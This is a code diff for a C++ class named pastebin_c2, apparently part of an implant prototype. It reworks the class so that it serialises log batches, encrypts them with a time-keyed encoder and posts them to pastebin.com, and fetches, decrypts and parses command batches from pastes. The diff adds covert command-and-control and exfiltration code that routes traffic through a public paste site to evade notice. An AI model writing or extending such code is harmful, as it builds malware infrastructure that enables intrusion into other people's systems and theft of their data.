@@ -8,27 +8,28 @@ pastebin_c2::pastebin_c2(Comm* comm_module, crypto_encoder* encoder)
 void pastebin_c2::sync_time() {
     // In a real implementation, we would perform a HEAD request to get the Date header.
     // For this prototype, we will simulate getting the time or use system time if network time isn't available.
-    // TODO: Parse Date header from WinHTTP response.
-    
-    // Using system time as a fallback/simulation for now
     last_synced_time = std::time(nullptr);
 }
 
-std::string pastebin_c2::post_data(const std::string& data) {
+std::string pastebin_c2::post_logs(const LogBatch& logs) {
     if (!comm_module || !encoder) return "";
 
-    // 1. Sync time (or ensure it's recent)
+    // 1. Sync time
     sync_time();
     
-    // 2. Set context for encryption
-    // Hint could be a random nonce or something derived from the state
-    std::string hint = "post_hint"; 
+    // 2. Serialize Logs to JSON
+    json j = logs;
+    std::string data = j.dump();
+
+    // 3. Set context for encryption
+    // For logs, we might use the current timestamp as the hint source
+    std::string hint = "log_batch"; 
     encoder->set_key_context(last_synced_time, hint);
 
-    // 3. Encrypt the data
+    // 4. Encrypt the data
     std::string encrypted_data = encoder->encrypt(data);
 
-    // 4. Send the request
+    // 5. Send the request
     std::string response = comm_module->SendRequest(
         L"pastebin.com", 
         443, 
@@ -40,8 +41,9 @@ std::string pastebin_c2::post_data(const std::string& data) {
     return response;
 }
 
-std::string pastebin_c2::fetch_data(const std::wstring& url) {
-    if (!comm_module || !encoder) return "";
+CommandBatch pastebin_c2::fetch_commands(const std::wstring& url) {
+    CommandBatch batch;
+    if (!comm_module || !encoder) return batch;
 
     // 1. Sync time
     sync_time();
@@ -57,15 +59,25 @@ std::string pastebin_c2::fetch_data(const std::wstring& url) {
         L"GET"
     );
 
-    if (encrypted_response.empty()) return "";
+    if (encrypted_response.empty()) return batch;
 
     // 3. Set context for decryption
-    // Hint must match what was used to encrypt it (e.g., extracted from metadata or fixed)
-    std::string hint = "fetch_hint"; 
+    // For commands, the hint should match what the C2 used.
+    // In a real scenario, we might extract this from the paste title or metadata.
+    // For prototype, we assume a fixed hint for commands.
+    std::string hint = "cmd_batch"; 
     encoder->set_key_context(last_synced_time, hint);
 
     // 4. Decrypt the data
     std::string decrypted_data = encoder->decrypt(encrypted_response);
 
-    return decrypted_data;
+    // 5. Parse JSON
+    try {
+        json j = json::parse(decrypted_data);
+        batch = j.get<CommandBatch>();
+    } catch (json::parse_error& e) {
+        std::cerr << "JSON Parse Error: " << e.what() << std::endl;
+    }
+
+    return batch;
 }
